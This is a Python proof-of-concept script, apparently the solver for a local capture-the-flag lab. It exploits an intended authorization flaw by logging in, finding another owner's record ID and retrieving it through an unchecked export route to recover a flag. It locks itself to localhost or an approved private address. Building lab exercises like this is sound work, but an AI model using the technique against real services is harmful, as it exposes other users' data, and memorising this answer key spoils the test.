#!/usr/bin/env python3
"""Scoped local HTTP proof of concept for the intended MT-04 object authorization flaw."""
import argparse
import http.cookiejar
from html.parser import HTMLParser
from pathlib import Path
import re
import urllib.error
import urllib.parse
import urllib.request

ROOT=Path(__file__).resolve().parents[1]
FLAG_RE=re.compile(r'MT\{mt04_[a-z0-9_]+\}')
class Inputs(HTMLParser):
    def __init__(self): super().__init__(); self.values={}
    def handle_starttag(self,tag,attrs):
        a=dict(attrs)
        if tag=='input' and a.get('name') in ('csrf_token','username','password'):
            self.values[a['name']]=a.get('value','')

def checked_base(raw):
    parsed=urllib.parse.urlparse(raw)
    approved={'localhost','127.0.0.1'}
    import os,ipaddress
    extra=os.environ.get('MT04_APPROVED_PRIVATE_HOST')
    if extra:
        try:
            address=ipaddress.ip_address(extra)
            if address.is_private and not address.is_unspecified: approved.add(extra)
        except ValueError: pass
    if parsed.scheme!='http' or parsed.hostname not in approved or parsed.port!=8084 or parsed.username or parsed.password:
        raise ValueError('PoC accepts only the configured local MT-04 lab URL')
    return raw.rstrip('/')

def solve(base='http://127.0.0.1:8084'):
    base=checked_base(base)
    creds=dict(line.split('=',1) for line in (ROOT/'private/credentials.txt').read_text().splitlines())
    opener=urllib.request.build_opener(urllib.request.HTTPCookieProcessor(http.cookiejar.CookieJar()))
    def get(path):
        with opener.open(base+path,timeout=8) as response:
            return response.status,response.read().decode('utf-8'),response.geturl()
    _,login_html,_=get('/login')
    parser=Inputs(); parser.feed(login_html)
    if not parser.values.get('csrf_token'): raise ValueError('Login CSRF token missing')
    body=urllib.parse.urlencode({'username':creds['username'],'password':creds['password'],'csrf_token':parser.values['csrf_token']}).encode()
    with opener.open(urllib.request.Request(base+'/login',data=body,method='POST'),timeout=8) as response:
        dashboard=response.read().decode('utf-8')
        if not response.geturl().endswith('/releases'): raise ValueError('Training login failed')
    own=re.findall(r'href="/release/(\d+)"',dashboard)
    targets=re.findall(r'Related review reference: transfer record (\d+)',dashboard)
    if not own or len(targets)!=1: raise ValueError('Dashboard lacks one in-scope target clue')
    own_id=int(own[0]); target_id=int(targets[0])
    status,own_page,_=get(f'/release/{own_id}')
    if status!=200 or 'RELEASE RECORD' not in own_page: raise ValueError('Own record failed')
    try: get(f'/release/{target_id}')
    except urllib.error.HTTPError as error:
        if error.code!=404: raise
    else: raise ValueError('Normal cross-owner route was not denied')
    status,body,_=get(f'/export/{target_id}')
    flags=FLAG_RE.findall(body)
    if status!=200 or len(flags)!=1: raise ValueError('Target export did not yield exactly one flag')
    print('PASS: logged in, own record opened, target ID found in dashboard, normal cross-owner denied, export allowed, one flag recovered')
    return flags[0]

if __name__=='__main__':
    parser=argparse.ArgumentParser(); parser.add_argument('--base-url',default='http://127.0.0.1:8084')
    args=parser.parse_args(); solve(args.base_url)
